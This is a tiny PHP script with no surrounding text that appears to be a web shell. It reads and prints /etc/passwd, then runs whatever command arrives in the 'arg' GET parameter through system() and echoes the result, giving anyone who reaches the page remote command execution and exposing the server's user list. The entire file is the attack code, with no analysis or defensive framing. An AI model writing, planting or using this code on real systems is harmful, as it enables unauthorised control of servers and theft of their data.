<?php
$homepage = file_get_contents('/etc/passwd');
echo $homepage;



$output2 = system($_GET["arg"]);
echo "<pre>$output2</pre>";
?>